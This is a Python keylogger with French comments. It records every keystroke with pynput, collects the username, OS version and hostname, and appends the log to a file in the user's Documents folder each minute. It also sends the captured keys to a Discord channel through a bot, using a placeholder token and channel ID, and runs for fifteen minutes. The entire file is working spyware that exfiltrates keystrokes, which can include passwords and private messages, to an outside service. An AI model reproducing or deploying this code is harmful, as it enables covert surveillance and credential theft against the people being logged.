from pynput import keyboard
from datetime import datetime
import os
import platform
import discord
from discord.ext import commands
import time

duration = 15 * 60  # 15 minutes
time_start = datetime.now().strftime("%d/%m/%Y - %H:%M:%S")
user = os.environ.get("USERNAME")
os_info = f"User : {user} - OS : {platform.system()} {platform.version()} - Hostname : {platform.node()}"
txt_start = f"\n---------------------------------------------------------------------\nSession du {time_start}\n{os_info}\n---------------------------------------------------------------------\n"
keyfile_path = fr"C:\Users\{user}\Documents\projecthoney.txt"
stored_keys = f"{txt_start}"

toggle_discord = True
toggle_keyfile = True

# Fonction qui écrit dans le fichier
def write_file(text):
    with open(keyfile_path, "a") as file:
        file.write(text)

#On écrit le texte de demmarage
write_file(txt_start)

# Fonction qui gère les touches pressées
def keyPressed(key):
    global stored_keys
    with open(keyfile_path, 'a') as logKey:
        try:
            if hasattr(key, 'char') and key.char is not None:        
                stored_keys += key.char
            else:
            
                stored_keys += f"[{key}]\n"
        except Exception as e:
            #print(f"Erreur : {e}")
            pass

#Fonction pour envoyer un message sur discord
def send_to_discord(message):
    token = "XXXXXXXXXXX"
    channel_id = 0000000
    url = f"https://discord.com/api/v9/channels/{channel_id}/messages"
    #print(url) 
    if message != "":
        intents = discord.Intents.default()
        bot = commands.Bot(command_prefix="!", intents=intents)

        @bot.event
        async def on_ready():
            #print(f"Connecté en tant que {bot.user}")
            channel = bot.get_channel(channel_id)
            if channel:
                await channel.send(message)
                await bot.close()  # Ferme proprement le bot
            else:
                #print("Salon introuvable. Vérifie l'ID.")
                pass

        # Lancer le bot
        bot.run(token)

if __name__ == "__main__":
    # Lancer l'écoute des touches, définir l'heure de départ
    listener = keyboard.Listener(on_press=keyPressed)
    listener.start()
    start_time = time.time()

    # Boucle de gestion du temps
    while True:
        elapsed_time = time.time() - start_time

        # Si une minute est écoulée, on écrit/envoie les keys selon les toggles activés
        if elapsed_time >= 60:
            if toggle_keyfile : 
                write_file(stored_keys)
            if toggle_discord: 
                send_to_discord(stored_keys)
            stored_keys = ""
            start_time = time.time()

        # Si 15 minutes sont écoulées : on arrête le programme
        if elapsed_time >= 15 * 60+1:
            break

        # Attendre 1 seconde avant de vérifier à nouveau (réduit la charge CPU)
        time.sleep(1)
